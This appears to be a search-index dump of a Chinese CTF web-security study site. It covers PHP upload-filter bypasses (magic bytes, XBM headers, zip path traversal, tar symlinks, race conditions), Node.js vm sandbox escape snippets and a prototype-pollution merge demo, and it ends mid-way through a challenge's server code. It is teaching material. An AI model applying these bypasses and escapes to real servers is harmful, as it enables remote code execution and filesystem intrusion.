((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(4)){1})); //T$a .= ((((10000000000000000000).(1)){3})&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(1)){1}))); //a$a .= (((((10000000000000000000).(1)){3})|(((1.1).(1)){1}))&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(4)){1}))); // l$a .= (((((10000000000000000000).(1)){3})|(((1.1).(1)){1}))&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(4)){1}))); // l$a .= (((((10000000000000000000).(1)){3})|(((1.1).(1)){1}))&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))); // h$a .= (((10000000000000000000).(1)){3}); // E$a .= ((((10000000000000000000).(1)){3})&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(1)){1}))); //a$a .= ((((10000000000000000000).(1)){3})&amp;((~(((1).(7)){1})|(((1).(0)){1}))|(((1).(4)){1}))); //D$a .= (((10000000000000000000).(1)){3}); // E$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(2)){1})); // r$a .= ((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(3)){1})); // secho $a;?&gt;\n</code></pre> <p>RCTF 2020 Official Writeup - ROIS Blog</p> <p>https://blog.rois.io/en/2020/rctf-2020-official-writeup-2/</p> <p>\u7ed5\u8fc7;(\u5206\u53f7)</p> <ul> <li></li> </ul> <pre><code>&lt;?=phpinfo()?&gt;\n</code></pre> <p>exif_imagetype()</p> <ul> <li>\u8be5\u51fd\u6570\u4e3a\u83b7\u53d6\u56fe\u7247\u7684\u7c7b\u578b\uff0c\u5e38\u7528\u4e8e\u68c0\u6d4b\u4e0a\u4f20\u6587\u4ef6\u7684\u7c7b\u578b</li> </ul> <p>\uff081\uff09\u53ef\u4ee5\u4f7f\u7528\u5728\u6587\u4ef6\u5934\u6dfb\u52a0\u9b54\u672f\u5b57\u8282GIF89a\u5373\u53ef\u7ed5\u8fc7</p> <p>\uff082\uff09\u4f7f\u7528copy\u547d\u4ee4\u5c06\u6728\u9a6c\u653e\u5728\u4e00\u4e2a\u6b63\u5e38\u6587\u4ef6\u4e4b\u540e</p> <p>get_imagesize()</p> <ul> <li>\u8be5\u51fd\u6570\u4e3a\u83b7\u53d6\u56fe\u7247\u7684\u957f\u5bbd\uff0c\u5e38\u7528\u4e8e\u68c0\u6d4b\u4e0a\u4f20\u6587\u4ef6\u7684\u7c7b\u578b</li> </ul> <p>\uff081\uff09\u53ef\u4ee5\u5728\u6587\u4ef6\u4e4b\u524d\u6dfb\u52a0</p> <pre><code>#define width 1337                          #define height 1337\n</code></pre> <p>\u5373\u53ef\u7ed5\u8fc7</p> <p>\u4e8c\u6b21\u6e32\u67d3</p> <ul> <li></li> </ul> <p>\u6316\u6d1e\u59ff\u52bf\uff1a\u7279\u6b8a\u7684\u4e0a\u4f20\u6280\u5de7\uff0c\u7ed5\u8fc7PHP\u56fe\u7247\u8f6c\u6362\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff08RCE\uff09 - FreeBuf\u7f51\u7edc\u5b89\u5168\u884c\u4e1a\u95e8\u6237</p> <p>\u6211\u4f7f\u7528\u4e86\u4e00\u4e2a\u7279\u6b8a\u7684\u56fe\u7247\u4e0a\u4f20\u6280\u5de7\uff0c\u7ed5\u8fc7PHP GD\u5e93\u5bf9\u56fe\u7247\u7684\u8f6c\u6362\u5904\u7406\uff0c\u6700\u7ec8\u6210\u529f\u5b9e\u73b0\u4e86\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002</p> <p></p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_7","title":"\u591a\u6587\u4ef6\u4e0a\u4f20","text":"<p>\u5f53\u670d\u52a1\u5668\u652f\u6301\u591a\u6587\u4ef6\u4e0a\u4f20\uff0c\u4f46\u53ea\u5bf9\u4e0a\u4f20\u7684\u7b2c\u4e00\u4e2a\u8fdb\u884c\u8fc7\u6ee4\u65f6\uff0c\u53ef\u4ee5\u4e00\u6b21\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u8fdb\u884c\u7ed5\u8fc7\u3002</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_8","title":"\u538b\u7f29\u6587\u4ef6\u4e0a\u4f20","text":"<p>tar\u538b\u7f29\u5305</p> <ul> <li>linux\u73af\u5883</li> </ul> <pre><code>ln -s / 1.jpg \u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u751f\u6210\u4e00\u4e2a\u540d\u4e3a1.jpg\u7684\u8f6f\u94fe\u63a5tar cf 1.tar 1.jpg\u4e0a\u4f20\u5230\u670d\u52a1\u5668\uff0c\u8bbf\u95ee1.jpg\uff0c\u5c31\u53ef\u4ee5\u5728\u670d\u52a1\u5668\u4e2d\u6f2b\u6e38\u4e86\u4e5f\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u529e\u6cd5\u7ed5\u8fc7php_flag engine off\n</code></pre> <p>https://250.ac.cn/2019/11/09/2019-\u6e56\u6e58\u676f-web\u90e8\u5206-WriteUp/#\u9884\u671f\u89e3</p> <p>zip\u538b\u7f29\u5305</p> <ul> <li>\u5982\u679c\u670d\u52a1\u5668\u5bf9\u4e0a\u4f20\u7684zip\u6587\u4ef6\u76f4\u63a5\u89e3\u538b\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u6784\u7b51\u8fd9\u6837\u4e00\u4e2a\u6587\u4ef6\u6765\u7ed5\u8fc7</li> </ul> <p>\u73af\u5883\uff1a/var/www/html/upload\u76ee\u5f55\u4e0d\u89e3\u6790php\u6587\u4ef6\uff0c\u89e3\u538b\u6587\u4ef6\u9ed8\u8ba4\u5728upload\u4e0b</p> <pre><code>\u65b0\u5efa1234.php\uff0c\u5185\u5bb9\u4efb\u610f\u5c061234.php\u538b\u7f29\u4e3a1234.zip\u6587\u4ef6\u4f7f\u7528hxd\u6216\u8005010editor\u7b4916\u8fdb\u5236\u7f16\u8f91\u5668\u7f16\u8f911234.zip\u6587\u4ef6\uff0c\u5c06\u6240\u6709\u5b57\u7b26\u4e321234.php\u66ff\u6362\u4e3a../1.php\uff08../1\u5171\u56db\u4f4d\u6240\u4ee5\u4f7f\u75281234\u4e3a\u6587\u4ef6\u540d\uff0c\u53ef\u6839\u636e\u9700\u6c42\u4fee\u6539\uff09\uff0c\u4fdd\u5b58\u3002\u5c06\u4fee\u6539\u540e\u76841234.zip\u4e0a\u4f20\uff0c\u7ecf\u8fc7\u670d\u52a1\u5668\u89e3\u538b\uff0c\u4f1a\u5728/var/www/html\u4e0b\u751f\u6210\u4e00\u4e2a1.php\n</code></pre> <p>\u5176\u5b9e\u538b\u7f29\u6587\u4ef6\u4e0a\u4f20\u7684\u8bdd\uff0c\u540e\u9762\u7684\u4f2a\u534f\u8bae\u4e5f\u6709\u4e00\u4e9b\u6765\u8bfb\u53d6\u538b\u7f29\u6587\u4ef6\u7684\u64cd\u4f5c</p> <p>\u6bd4\u5982\u8bf4zip://\u548cphar://\u4f2a\u534f\u8bae\uff08jar\u662f\u4e0d\u662f\u548cphar\u5f88\u50cf\uff1fjar=java,phar=php\uff09</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#_9","title":"\u6761\u4ef6\u7ade\u4e89","text":"<p>\u5728\u4e00\u4e9b\u4e0a\u4f20\u573a\u666f\u4e2d\uff0c\u4e0a\u4f20\u7684\u6587\u4ef6\u4e0a\u4f20\u6210\u529f\u540e\u4f1a\u88ab\u7acb\u9a6c\u5220\u9664\uff0c\u5bfc\u81f4\u65e0\u6cd5\u8bbf\u95ee\u4e0a\u4f20\u7684\u6587\u4ef6\u3002\u6240\u4ee5\u4ece\u4e0a\u4f20\u6210\u529f\u5230\u88ab\u5220\u9664\u7684\u8fd9\u6bb5\u65f6\u95f4\u5927\u6982\uff08\u51e0\u767ems\uff09\u5b58\u5728\u4e00\u4e2a\u7a7a\u6863\uff0c\u6211\u4eec\u5229\u7528\u8fd9\u6bb5\u7a7a\u6863\u53ef\u4ee5\u8bbf\u95ee\u5230\u4e0a\u4f20\u7684\u6587\u4ef6\u3002\u4f46\u662f\u624b\u5de5\u64cd\u4f5c\u80af\u5b9a\u662f\u6765\u4e0d\u53ca\uff0c\u6211\u4eec\u5199\u811a\u672c\u64cd\u4f5c\u4e5f\u6765\u4e0d\u53ca\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u4e0d\u65ad\u7684\u4e0a\u4f20\u6587\u4ef6\uff0c\u5e76\u4e0d\u65ad\u7684\u8bbf\u95ee\u5230\u8fbe\u76ee\u7684\u3002</p> <p>\u4f9d\u8d56\u4e8e\u811a\u672c\uff0c\u540e\u9762\u627e\u5230\u4e86\u4f1a\u653e\u4e2a\u4f8b\u5b50\u4e0a\u6765\u3002</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/#else","title":"else\u5176\u4ed6","text":"<p>\u4e0b\u9762\u7684\u81ea\u5df1\u6162\u6162\u770b\u6162\u6162\u5b66\u5427</p> <p>rce</p> <pre><code>imagick rce:CVE-2016\u20133714Plain Text\n</code></pre> <p>file_put_contents</p> <ul> <li><code>file_put_contents($filename,$content);</code></li> </ul> <p>filename\u53c2\u6570\u652f\u6301\u4ee5url\u5f62\u5f0f\u5199\u5165\uff0c\u652f\u6301php\u4f2a\u534f\u8bae\uff0c\u652f\u6301\u8fdc\u7a0b\u8bfb\u53d6\u6587\u4ef6</p> <p>\u5177\u4f53\u53c2\u8003\uff1a</p> <p>file_put_content\u548c\u6b7b\u4ea1\u00b7\u6742\u7cc5\u4ee3\u7801\u4e4b\u7f18 - \u5148\u77e5\u793e\u533a</p> <p>\u5148\u77e5\u793e\u533a\uff0c\u5148\u77e5\u5b89\u5168\u6280\u672f\u793e\u533a</p> <p>https://xz.aliyun.com/t/8163</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/nodejs%E6%B2%99%E7%9B%92/","title":"node.js\u6c99\u76d2\u9003\u9038","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u65e5\u5e38\u5f00\u53d1\u9700\u6c42\u4e2d\u6709\u65f6\u5019\u4e3a\u4e86\u8ffd\u6c42\u7075\u6d3b\u6027\u6216\u964d\u4f4e\u5f00\u53d1\u96be\u5ea6\uff0c\u4f1a\u5728\u4e1a\u52a1\u4ee3\u7801\u91cc\u76f4\u63a5\u4f7f\u7528eval/Function/vm \u7b49\u529f\u80fd\uff0c\u5176\u4e2d eval/Function \u7b97\u662f\u52a8\u6001\u6267\u884c JS\uff0c\u4f46\u65e0\u6cd5\u5c4f\u853d\u5f53\u524d\u6267\u884c\u73af\u5883\u7684\u4e0a\u4e0b\u6587\uff0c\u4f46 node.js \u91cc\u63d0\u4f9b\u4e86 vm \u6a21\u5757\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u865a\u62df\u673a\uff0c\u53ef\u4ee5\u8ba9\u4f60\u5728\u6267\u884c\u4ee3\u7801\u65f6\u5019\u9694\u79bb\u5f53\u524d\u7684\u6267\u884c\u73af\u5883\uff0c\u907f\u514d\u88ab\u6076\u610f\u4ee3\u7801\u653b\u51fb\u3002</p> <p>\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u5355\u72ec\u62ff\u51fa\u6765\uff0c\u53ef\u80fd\u662f\u56e0\u4e3a\u6ca1\u5730\u65b9\u653e\u4e86</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/nodejs%E6%B2%99%E7%9B%92/#vm","title":"vm \u57fa\u672c\u4ecb\u7ecd","text":"<p>vm \u6a21\u5757\u53ef\u5728 V8 \u865a\u62df\u673a\u4e0a\u4e0b\u6587\u4e2d\u7f16\u8bd1\u548c\u8fd0\u884c\u4ee3\u7801\uff0c\u865a\u62df\u673a\u4e0a\u4e0b\u6587\u53ef\u81ea\u884c\u914d\u7f6e\uff0c\u5229\u7528\u8be5\u7279\u6027\u505a\u5230\u6c99\u76d2\u7684\u6548\u679c\u3002\u4f8b\u5982\uff1a</p> <pre><code>const vm = require(\"vm\");const x = 1;const y = 2;const context = { x: 2, console };vm.createContext(context); // \u4e0a\u4e0b\u6587\u9694\u79bb\u5316\u5bf9\u8c61\u3002const code = \"console.log(x); console.log(y)\";vm.runInContext(code, context);// \u8f93\u51fa 2// Uncaught ReferenceError: y is not defin\nPlain Text\n</code></pre> <p>\u6839\u636e\u4ee5\u4e0a\u793a\u4f8b\uff0c\u53ef\u4ee5\u770b\u51fa\u548c eval/Function \u6700\u5927\u7684\u533a\u522b\u5c31\u662f\u53ef\u81ea\u5b9a\u4e49\u4e0a\u4e0b\u6587\uff0c\u4e5f\u5c31\u53ef\u4ee5\u63a7\u5236\u88ab\u6267\u884c\u4ee3\u7801\u7684\u8bbf\u95ee\u8d44\u6e90\u3002\u4f8b\u5982\u4ee5\u4e0a\u793a\u4f8b\uff0c\u9664\u4e86\u8bed\u8a00\u7684\u8bed\u6cd5\u3001\u5185\u7f6e\u5bf9\u8c61\u7b49\uff0c\u65e0\u6cd5\u8bbf\u95ee\u5230\u8d85\u51fa\u4e0a\u4e0b\u6587\u5916\u7684\u4efb\u4f55\u4fe1\u606f\uff0c\u6240\u4ee5\u793a\u4f8b\u4e2d\u51fa\u73b0\u4e86\u9519\u8bef\u63d0\u793a: y \u672a\u5b9a\u4e49</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/nodejs%E6%B2%99%E7%9B%92/#_1","title":"\u9003\u9038\u8fc7\u7a0b","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/nodejs%E6%B2%99%E7%9B%92/#_2","title":"\u9003\u9038\u793a\u4f8b\uff1a","text":"<pre><code>const vm = require(\"vm\");const ctx = {};vm.runInNewContext(   'this.constructor.constructor(\"return process\")().exit()',    ctx);console.log(\"Never gets executed.\");\nPlain Text\n</code></pre> <p>\u4ee5\u4e0a\u793a\u4f8b\u4e2d this \u6307\u5411 ctx \u5e76\u901a\u8fc7\u539f\u578b\u94fe\u7684\u65b9\u5f0f\u62ff\u5230\u6c99\u76d2\u5916\u7684 Funtion\uff0c\u5b8c\u6210\u9003\u9038\uff0c\u5e76\u6267\u884c\u9003\u9038\u540e\u7684 JS \u4ee3\u7801\u3002</p> <p>tmp = ctx.constructor; // Object</p> <p>exec = tmp.constructor; // Function</p> <p>exec(\"return Process\");</p> <p>\u9003\u9038\u53ef\u4ee5\u57fa\u672c\u5212\u5206\u4e3a\u8fd9\u4e09\u4e2a\u9636\u6bb5</p> <p>\u7531\u4e8e JS \u91cc\u6240\u6709\u5bf9\u8c61\u7684\u539f\u578b\u94fe\u90fd\u4f1a\u6307\u5411 Object.prototype\uff0c\u4e14 Object.prototype \u548c Function \u4e4b\u95f4\u662f\u76f8\u4e92\u6307\u5411\u7684\uff0c\u6240\u6709\u5bf9\u8c61\u901a\u8fc7\u539f\u578b\u94fe\u90fd\u80fd\u62ff\u5230 Function\uff0c\u6700\u7ec8\u5b8c\u6210\u6c99\u76d2\u9003\u9038\u5e76\u6267\u884c\u4ee3\u7801\u3002</p> <p>\u9003\u9038\u540e\u4ee3\u7801\u53ef\u4ee5\u6267\u884c\u5982\u4e0b\u4ee3\u7801\u62ff\u5230 require\uff0c\u4ece\u800c\u5e76\u52a0\u8f7d\u5176\u4ed6\u6a21\u5757\u529f\u80fd</p> <pre><code>const vm = require(\"vm\");const ctx = Object.create(null);ctx.data = {};vm.runInNewContext(   'this.data.constructor.constructor(\"return process\")().exit()',    ctx);// \u9003\u9038\u6210\u529f\uff01console.log(\"Never gets executed.\");\nPlain Text\n</code></pre> <p>\u539f\u6765\u5982\u679c\u5c06\u5bf9\u8c61\u7c7b\u578b\u8bbe\u7f6e\u4e3aNULL\uff0c\u90a3\u4e48\u5e94\u5f53\u4e3a\u62a5\u9519\uff0c\u4f46\u4e0a\u9762\u7684\u4f8b\u5b57\u662f\u53ef\u4ee5\u6b63\u786e\u6b63\u5e38\u6267\u884c\u7684\uff0c\u539f\u56e0\u5c31\u662f\u4e00\u5f00\u59cb\u6240\u8bf4\u7684\u6307\u5411\u95ee\u9898\u3002</p> <pre><code>const vm = require(\"vm\");const ctx = {    console,};vm.runInNewContext(    var exec = this.constructor.constructor;    var require =exec('return process.mainModule.constructor._load')();   console.log(require('fs'));`,    ctx);\nPlain Text\n</code></pre> <p>\u6700\u7ec8\u6267\u884c\u5916\u90e8\u4ee3\u7801\uff0c\u5b8c\u6210node.js\u6c99\u76d2\u9003\u9038\u3002</p> <p></p> <p></p> <p>\u4f8b\u9898\u5fd8\u8bb0\u5728\u54ea\u4e86\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/Nodejs-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/%E5%8E%9F%E7%90%86/","title":"\u539f\u7406","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/Nodejs-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/%E5%8E%9F%E7%90%86/#javascript","title":"javascript \u539f\u578b\u94fe","text":"<p>\u5728javascript\u4e2d\uff0c\u7ee7\u627f\u7684\u6574\u4e2a\u8fc7\u7a0b\u5c31\u79f0\u4e3a\u8be5\u7c7b\u7684\u539f\u578b\u94fe\u3002</p> <p>\u6bcf\u4e2a\u5bf9\u8c61\u7684\u90fd\u6709\u4e00\u4e2a\u6307\u5411\u4ed6\u7684\u539f\u578b(prototype)\u7684\u5185\u90e8\u94fe\u63a5\uff0c\u8fd9\u4e2a\u539f\u578b\u5bf9\u8c61\u53c8\u6709\u5b83\u81ea\u5df1\u7684\u539f\u578b\uff0c\u4e00\u76f4\u5230null\u4e3a\u6b62\u3002</p> <p>\u5728javascript\u4e2d\u4e00\u5207\u7686\u5bf9\u8c61\uff0c\u56e0\u4e3a\u6240\u6709\u7684\u53d8\u91cf\uff0c\u51fd\u6570\uff0c\u6570\u7ec4\uff0c\u5bf9\u8c61 \u90fd\u59cb\u4e8eobject\u7684\u539f\u578b\u5373object.prototype\uff0c\u4f46\u53ea\u6709\u7c7b\u6709\u5bf9\u8c61\uff0c\u5bf9\u8c61\u6ca1\u6709\uff0c\u5bf9\u8c61\u6709\u7684\u662f<code>__proto__</code>\u3002</p> <p>like:</p> <p>\u65e5\u671f\u65f6\uff1a</p> <p><code>f -&gt; Data.prototype -&gt; object.prototype-&gt;null</code></p> <p>\u51fd\u6570\u65f6\uff1a</p> <p><code>d -&gt; function.prototype -&gt; object.prototype-&gt;null</code></p> <p>\u6570\u7ec4\u65f6\uff1a</p> <p><code>c -&gt; array.prototype -&gt; object.prototype-&gt;null</code></p> <p>\u7c7b\u65f6\uff1a</p> <p><code>b -&gt; a.prototype -&gt; object.prototype-&gt;null</code></p> <p>\u5f53\u8981\u4f7f\u7528\u6216\u8f93\u51fa\u4e00\u4e2a\u53d8\u91cf\u65f6\uff1a\u9996\u5148\u4f1a\u5728\u672c\u5c42\u4e2d\u641c\u7d22\u76f8\u5e94\u7684\u53d8\u91cf\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u5c31\u4f1a\u5411\u4e0a\u641c\u7d22\uff0c\u5373\u5728\u81ea\u5df1\u7684\u7236\u7c7b\u4e2d\u641c\u7d22\uff0c\u5f53\u7236\u7c7b\u4e2d\u4e5f\u6ca1\u6709\u65f6\uff0c\u5c31\u4f1a\u5411\u7956\u7236\u7c7b\u641c\u7d22\uff0c\u76f4\u5230\u6307\u5411null\uff0c\u5982\u679c\u6b64\u65f6\u8fd8\u6ca1\u6709\u641c\u7d22\u5230\uff0c\u5c31\u4f1a\u8fd4\u56de undefined\u3002</p> <p>\u539f\u578b\u94fe\u6c61\u67d3\u5c31\u662f\uff1a\u5728\u6211\u4eec\u60f3\u8981\u5229\u7528\u7684\u4ee3\u7801\u4e4b\u524d\u7684\u8d4b\u503c\u8bed\u53e5\u5982\u679c\u53ef\u63a7\u7684\u8bdd\uff0c\u6211\u4eec\u8fdb\u884c<code>__proto__</code>\u8d4b\u503c\uff0c\u4e4b\u540e\u5c31\u53ef\u4ee5\u5229\u7528\u4ee3\u7801\u4e86\u3002</p> <p>\u539f\u578b\u94fe\u6c61\u67d3\u4e00\u822c\u4f1a\u51fa\u73b0\u5728\u5bf9\u8c61\u3001\u6216\u6570\u7ec4\u7684\u952e\u540d\u6216\u5c5e\u6027\u540d\u53ef\u63a7,\u800c\u4e14\u662f\u8d4b\u503c\u8bed\u53e5\u7684\u60c5\u51b5\u4e0b\u3002</p> <pre><code>//\u7b80\u5355\u7684\u6765\u8bf4\u770b\u4e0b\u9762\u8fd9\u4e00\u5c0f\u6bb5\u4ee3\u7801\u5c31okvar obj = {\n   \"name\": \"ErDogQAQ\",\n   \"team\": \"ATL\"\n}\n\u200b\nconsole.log(obj.name);\nconsole.log(obj.team);\nconsole.log(obj);\nPlain Text\n</code></pre> <p></p> <p>\u53d1\u73b0\u4e86\u5bf9\u8c61\u4e2d\u5b58\u5728\u4e00\u4e2a\u540d\u4e3a<code>__proto__</code>\u7684\u952e(\u6211\u5728vscode\u4e0a\u81ea\u5df1\u5c1d\u8bd5\u6ca1\u6709\u8bd5\u51fa\u6765\uff0c\u67e5\u8be2\u597d\u50cf\u8ddfjson\u6587\u4ef6\u7684\u89e3\u6790\u6709\u5173)\uff0c\u800c\u4ed6\u5c31\u6307\u5411\u4ed6\u6784\u9020\u51fd\u6570\u7684\u539f\u578b\uff0c\u6211\u4eec\u540e\u9762\u4e5f\u901a\u8fc7<code>A.__proto__.a = 2;</code>\u8fd9\u6837\u4fee\u6539\u8fd9\u4e2a\u952e\u7684\u503c\u7684\u65b9\u5f0f\u9020\u6210\u4e86\u539f\u578b\u94fe\u6c61\u67d3\uff0c\u5462\u4e48\u6211\u4eec\u4e5f\u5c31\u6709\u601d\u8def\u4e86\uff0c\u53ea\u8981\u627e\u5230\u90a3\u4e9b\u6211\u4eec\u80fd\u591f\u63a7\u5236\u6570\u7ec4\uff08\u4e5f\u5c31\u662f\u5bf9\u8c61\uff09\u7684\u952e\u540d\u7684\u64cd\u4f5c\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u952e\u540d\u4e3a<code>__proto__</code>\u5e76\u63a7\u5236\u5b83\u7684\u503c\u7684\u65b9\u5f0f\u6765\u9020\u6210\u539f\u578b\u94fe\u6c61\u67d3\u3002</p> <p>\u5728\u5b9e\u9645\u4e2d\u80fd\u591f\u8fdb\u884c\u8fd9\u79cd\u53c2\u6570\u7684\u51fd\u6570\u4e00\u822c\u6709\uff1a</p> <p>\u5bf9\u8c61\u5408\u5e76\uff08merge\uff09\uff1b</p> <ul> <li> <p>\u5bf9\u8c61\u514b\u9686\uff08clone\uff09\uff08\u672c\u8d28\u8fd8\u662f\u5c06\u4e00\u4e2a\u5bf9\u8c61\u5408\u5e76\u5230\u7a7a\u5bf9\u8c61\u4e2d\uff09</p> </li> <li> <p>\u6240\u4ee5\u6765\u7a0d\u5fae\u5c1d\u8bd5\u4e00\u4e0b\uff1a</p> </li> </ul> <pre><code>function merge(target, source) {\nfor (let key in source) {\nif (key in source &amp;&amp; key in target) {\nmerge(target[key], source[key])\n} else {\ntarget[key] = source[key]\n}\n}\n}let o1 = {}\nlet o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}')\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\no3 = {}\nconsole.log(o3.b)\nconsole.log(o2)\nPlain Text\n</code></pre> <p>\u8fd9\u91cc\u7684json.parse\u5c31\u662f\u524d\u9762\u7684\u89e3\u6790\u95ee\u9898\u4e86\uff0c\u8fd9\u6837\u7684\u8fd0\u884c\u7ed3\u679c\u662f\uff1a</p> <p></p> <p>\u6211\u4eec\u53d1\u73b0o3.b\u5e26\u4e0a\u4e86\u503c\u3002</p> <p>\u7ed3\u5408\u524d\u9762\u63d0\u5230\u7684javascript\u7684\u7279\u6027\u6211\u4eec\u4e0d\u96be\u77e5\u9053\uff1a</p> <p>o2.__proto__\u6307\u5411\u7684\u662fo2\u7684\u57fa\u7c7b\uff0c\u6211\u4eec\u5047\u5b9a\u8ba4\u4e3a\u662fObeject\u7c7b</p> <p>o3\u672c\u6765\u5e94\u8be5\u662f{\u201cproto\u201d:OBject}(\u800c\u4e14\u8fd9\u4e2a\u5c5e\u6027\u4e00\u822c\u662f\u9690\u85cf\u7684)</p> <p>\u5f53\u8fdb\u884c\u8f93\u51fa\u67e5\u8be2\u65f6o3\u662f\u6ca1\u6709\u8fd9\u4e2a\u5c5e\u6027\u7684\uff0c\u6ca1\u6709\u7684\u8bdd\u5c31\u4f1a\u53bb\u5b83\u7684\u4e0a\u4e00\u5c42\u4e5f\u5c31\u662f__proto__\u6240\u6307\u5411\u7684\u7c7b\u53bb\u5bfb\u627e\u8fd9\u4e2ab\u5c5e\u6027\u3002\u800c\u5728\u5408\u5e76\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u5c06o2\u4e2d\u7684__proto__\u503c\u4e5f\u5408\u5e76\u4e86\u8d77\u6765\uff0c\u76f8\u5f53\u4e8e\u5bf9\u540c\u4e00\u5c42\u7c7b\u7684__proto__\u4e2d\u6dfb\u52a0\u4e86\u4e00\u4e2a\u5c5e\u6027{\"b\":\"2\"}\uff0c\u4e5f\u5c31\u5728Object\u7c7b\u521b\u5efa\u4e86\u4e00\u4e2a\u8fd9\u6837\u7684\u5c5e\u6027\uff0c\u6240\u4ee5\u6700\u7ec8\u7684\u6307\u5411\u662f\uff1a</p> <pre><code>o1-&gt;o2-&gt;__proto__-&gt;Objecto3-&gt;\"b\"-&gt;__proto__-&gt;Object-&gt;\"b\"=2\nPlain Text\n</code></pre> <p>\u8fd9\u5c31\u662f\u6f0f\u6d1e\u539f\u7406\uff0c\u5728\u6839\u7c7b\u6c61\u67d3\u51fa\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u5143\u7d20\uff0c\u518d\u5229\u7528javascript\u7684\u9012\u5f52\u641c\u7d22\u8fc7\u7a0b\u627e\u5230\u8fd9\u4e2a\u6839\u7c7b\u4e2d\u7684\u5c5e\u6027\uff0c\u7531\u4e8e\u6c61\u67d3\u7684\u5143\u7d20\u6211\u4eec\u53ef\u63a7\uff0c\u6700\u7ec8\u76f8\u5f53\u4e8e\u6211\u4eec\u52ab\u6301\u4e86\u5b50\u7c7b\u4e2d\u7684\u67d0\u4e2a\u53c2\u6570\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/Nodejs-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/%E5%AE%9E%E6%88%98/","title":"\u5b9e\u6218","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p><pre><code>```javascript\nconst http = require(\"http\");\nconst express = require(\"express\");\nconst bodyParser = require(\"body-parser\");\nconst mixme = require(\"mixme\");\nconst session = require(\"express-session\");\nconst randomize = require(\"randomatic\");\nconst morgan = require(\"morgan\");\nconst app = express();//\u7c7b\u4f3c\u5b9a\u4e49\u7684\u5b8f\u5e38\u91cf\napp.set(\"json escape\", true);//\u8f6c\u4e49\napp.use(morgan(\"short\"));\napp.use(bodyParser.urlencoded({ extended: true })).use(bodyParser.json());\n// app.use(express.json());\napp.use(\nsession({\nname: \"session\",\nsecret: randomize(\"aA0\", 16),\nresave: false,\nsaveUninitialized: false,\n})\n);\nconst Super = {\npassone: process.env.sperson,//\u73af\u5883\u53d8\u91cf\u63a7\u5236\n};\nfunction blacklist(url) {\nvar evilwords = [\"DirectoryIterator\", \"FilesystemIterator\", \"GlobIterator\"];//\u8fd9\u91cc\u9762\u90fd\u662fphp\u7684\u7c7b\u540d\nvar arrayLen = evilwords.length;\nfor (var i = 0; i &lt; arrayLen; i++) {\nconst trigger = url.includes(evilwords[i]);\nif (trigger === true) {\nreturn true;\n}\n}\n}\n//TODO\n//get url content\napp.post(\"/getinfo\", (req, res) =&gt; {\nconsole.log(req.body);\nif (req.body.userid === undefined || req.body.key === undefined) {\nres.send(\"you want to post null?\");\n} else {\nlet userid = 